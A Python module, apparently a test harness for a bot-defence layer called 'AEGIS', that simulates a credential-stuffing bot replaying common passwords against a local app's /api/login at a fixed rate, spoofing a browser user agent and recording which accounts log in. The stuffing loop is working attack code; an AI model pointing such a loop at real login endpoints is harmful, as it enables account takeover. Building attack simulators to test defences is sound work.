"""A credential-stuffing bot, as seen from outside.

It replays a list of leaked email/password pairs against /api/login at about 8 guesses a second from ONE
identity. Every request is an ordinary-looking login, so the OWASP Core Rule Set has nothing to flag: this is
the kind of campaign that rule sets miss by design. A few pairs in the list are real accounts.
"""

from __future__ import annotations

import json
import threading
import time
import urllib.error
import urllib.request

BASE = "http://127.0.0.1:8080"
VALID = [("admin@booknook.test", "admin123"), ("ada@booknook.test", "Tr1cky!pass")]
LEAKED_EMAILS = ["admin", "jim", "ada", "bender", "root", "info", "sales", "support", "dev", "test"]
LEAKED_PASSWORDS = ["123456", "password", "qwerty", "letmein", "welcome", "iloveyou", "monkey", "dragon", "sunshine", "abc123"]


def guesses(n: int):
    """n guesses: mostly wrong, the two real accounts sprinkled in."""
    out, i = [], 0
    for e in LEAKED_EMAILS:
        for p in LEAKED_PASSWORDS:
            out.append((f"{e}@booknook.test", p))
    out[12:12] = [VALID[0]]
    out[60:60] = [VALID[1]]
    while len(out) < n:
        i += 1
        out.append((f"user{i}@booknook.test", LEAKED_PASSWORDS[i % len(LEAKED_PASSWORDS)]))
    return out[:n]


class Stuffer(threading.Thread):
    def __init__(self, n: int = 400, rate: float = 8.0, token: str = "stuffing-bot-1"):
        super().__init__(daemon=True)
        self.n, self.delay, self.token = n, 1.0 / rate, token
        self.stop_flag = threading.Event()
        self.stats = {"guesses": 0, "reached_app": 0, "blocked": 0, "valid_found": []}

    def run(self):
        for email, pw in guesses(self.n):
            if self.stop_flag.is_set():
                return
            r = urllib.request.Request(BASE + "/api/login", method="POST",
                                       data=json.dumps({"email": email, "password": pw}).encode(),
                                       headers={"Content-Type": "application/json", "Authorization": f"Bearer {self.token}",
                                                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0"})
            try:
                with urllib.request.urlopen(r, timeout=10) as resp:
                    code, body = resp.status, resp.read(300).decode("utf-8", "replace")
            except urllib.error.HTTPError as e:
                code, body = e.code, e.read(300).decode("utf-8", "replace")
            except Exception:
                code, body = 0, ""
            self.stats["guesses"] += 1
            if code in (429, 403) and "AEGIS" in body:
                self.stats["blocked"] += 1
            else:
                self.stats["reached_app"] += 1
                if code == 200 and email not in self.stats["valid_found"]:
                    self.stats["valid_found"].append(email)
            time.sleep(self.delay)
